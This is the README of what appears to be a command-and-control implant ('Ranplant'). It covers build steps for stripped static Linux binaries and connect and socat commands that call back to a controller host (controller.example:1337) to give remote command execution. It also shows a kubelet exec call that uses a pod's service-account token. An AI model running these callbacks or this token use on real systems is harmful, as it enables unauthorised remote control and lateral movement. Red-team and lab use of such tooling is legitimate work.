# Ranplant

Ranplant is Ran's target-side execution component. It provides a structured,
versioned command protocol and retains the earlier `ran-ws` kubelet WebSocket
capability.

## Structured session

Connect Ranplant directly to a Ran listener:

```sh
/tmp/ranplant connect --host controller.example --port 1337
```

Use `--detach` when launching through an existing shell. The parent returns
success only after the detached connection completes its protocol handshake.
Ran registers the new connection under a distinct Ranplant session ID and the
`Start Ranplant Session` action closes the source shell after that launch
command finishes. The action result records both session IDs in the operational
timeline.

Alternatively, run it behind any full-duplex byte transport that can attach to
the process's standard input and output. For example, with `socat`:

```sh
socat TCP:controller.example:1337 EXEC:'/tmp/ranplant session --stdio'
```

The protocol does not depend on TCP or `socat`. Native connect is provided as
the default callback vector, while stdio allows SSH, Kubernetes exec, WebSocket
relays, and other transports to carry the same framed protocol.

Ranplant starts each command in a separate process group, streams stdout and
stderr independently, and can terminate the whole group without terminating
the session. Its initial handshake reports the kernel operating-system family,
architecture, and parsed `/etc/os-release` identity without invoking a shell.

## Local development and Linux builds

Run the focused checks from the repository root:

```sh
cargo fmt --all -- --check
cargo clippy -p ranplant-protocol -p ranplant -p c2 --all-targets --locked -- -D warnings
cargo test -p ranplant-protocol -p ranplant -p c2 --locked
```

`make build-ranplant` builds for the development host. On macOS this produces
a macOS binary at `target/release/ranplant`, which is useful for local CLI and
protocol testing but cannot be deployed to a Linux target.

Use Zig to cross-compile the static Linux artifacts from macOS. Install the
one-time prerequisites:

```sh
brew install zig
cargo install --locked --version 0.23.4 cargo-zigbuild
rustup component add llvm-tools-preview
rustup target add x86_64-unknown-linux-musl aarch64-unknown-linux-musl
```

Build and strip both release binaries:

```sh
cargo zigbuild --locked --release --package ranplant --target x86_64-unknown-linux-musl
cargo zigbuild --locked --release --package ranplant --target aarch64-unknown-linux-musl

host="$(rustc -vV | sed -n 's/^host: //p')"
llvm_strip="$(rustc --print sysroot)/lib/rustlib/${host}/bin/llvm-strip"
"${llvm_strip}" --strip-all target/x86_64-unknown-linux-musl/release/ranplant
"${llvm_strip}" --strip-all target/aarch64-unknown-linux-musl/release/ranplant

mkdir -p dist
cp target/x86_64-unknown-linux-musl/release/ranplant dist/ranplant-linux-amd64
cp target/aarch64-unknown-linux-musl/release/ranplant dist/ranplant-linux-arm64
chmod +x dist/ranplant-linux-*
```

Verify the artifact types, checksums, and basic startup behavior:

```sh
file dist/ranplant-linux-*
shasum -a 256 dist/ranplant-linux-*

docker run --rm --platform linux/amd64 \
  -v "$PWD/dist:/dist:ro" \
  debian:12-slim /dist/ranplant-linux-amd64 --help
```

The `file` output should identify a statically linked, stripped Linux ELF for
the expected architecture. The dedicated `Build Ranplant` GitHub workflow uses
the same targets, Zig toolchain, stripping step, and artifact names.

## Kubelet exec

Read the bearer token from a file rather than exposing it in process arguments:

```sh
ranplant kubelet-exec \
  --url 'wss://kubernetes.default.svc/api/v1/namespaces/default/pods/nginx/exec?command=id' \
  --token-file /var/run/secrets/kubernetes.io/serviceaccount/token \
  --ca-file /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

TLS certificates and hostnames are verified by default. The explicit
`--insecure-skip-tls-verify` option is intended only for controlled labs.
